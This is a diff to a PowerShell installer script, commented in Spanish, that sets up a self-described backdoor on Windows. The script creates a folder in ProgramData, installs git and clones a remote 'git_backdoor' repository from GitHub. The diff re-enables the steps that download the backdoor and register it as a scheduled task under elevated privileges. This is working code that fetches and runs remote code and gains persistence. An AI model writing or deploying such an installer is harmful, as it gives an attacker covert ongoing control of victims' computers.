@@ -1,20 +1,34 @@
 # ================================================
+# ================================================
+# ================================================
+# ================================================
+# ================================================
+# ================================================
 # Configuración
+
 ## Cambiar los valores conforme a las necesidades, ver Anexo 0 del README.md
 
 ### Ubucacion principal en que se creará el programa
-$location_root = $env:ProgramData
+$location_root = $env:ProgramData # c:\ProgramData\
 
 ### Carpeta para contener el programa
-$folder_name = "backdoor_program" 
+$folder_name = "backdoor_program"
 
 ### Programa a ejecutar
 $program_to_execute = "main.ps1" 
 
 ### Repositorio del que se descargará el archivo a ejecutar
-$git_origin = "https://github.com/elcaza/git_backdoor.git"
+$git_origin = "https://github.com/elcaza/git_backdoor.git" # Your repository
+
+### Nombre de la tarea programada
+$task_name = "bd_task"
 
 # End Configuración
+# ================================================
+# ================================================
+# ================================================
+# ================================================
+# ================================================
 # ================================================
 
 $is_git_ready=$false
@@ -64,9 +78,17 @@ function install_git {
 
 # Refresca las variables de entorno para encontrar git
 function refresh_path {
-	$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") +
-		";" +
-		[System.Environment]::GetEnvironmentVariable("Path","User")
+	$job = Start-Job { 
+		function refresh_path {
+			$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") +
+			";" +
+			[System.Environment]::GetEnvironmentVariable("Path","User")
+		} refresh_path	
+	}
+	# Creamos una tarea asincrona
+	Wait-Job $job
+	Receive-Job $job
+	"FN: Path actualizado"
 }
 
 # Si tiene git instalado y puede encontrarlo descarga el repositorio del backdoor
@@ -129,24 +151,29 @@ function load_backdoor {
 }
 
 # Inicializa el instalador
-function start_installer{
+function start_installer{	
 	# Si git no está instalado
 	if( !(is_git_installed) ) {
-
-
-		"Creando ubicaciones"
-		# Creando ubicaciones
-		Set-Location $location_root
-		mkdir $folder_name
-		Set-Location $folder_name 
-
-		
+		"Git no esta"
+		try {
+			"Creando ubicaciones"
+			# Creando ubicaciones
+			Set-Location $location_root
+			mkdir $folder_name
+			Set-Location $folder_name 
+		} catch [System.Management.Automation.CommandNotFoundException] {
+			"Error al crear ubicaciones"
+		}
+		try {
+			refresh_path
+		} catch {
+			"FN: error"
+			exit
+		}
 		"Descargando git"
 		# Descargamos git
 		download_git
 		"Git descargado"
-
-
 
 		"Instalando git"
 		# Instalamos git
@@ -202,7 +229,7 @@ function start_installer{
 		
 		#Download repo
 		"INSTALLER Descargando backdoor"
-		#download_backdoor
+		download_backdoor
 
 		"INSTALLER descargado backdoor"
 		sleep -s 2
@@ -214,7 +241,8 @@ function start_installer{
 		"privilegios elevados"
 
 		# Creando tarea programada
-		# load_backdoor
+		load_backdoor
+		
 		"ISNTALLER Programa finalizado"
 		sleep -s 2
 	}
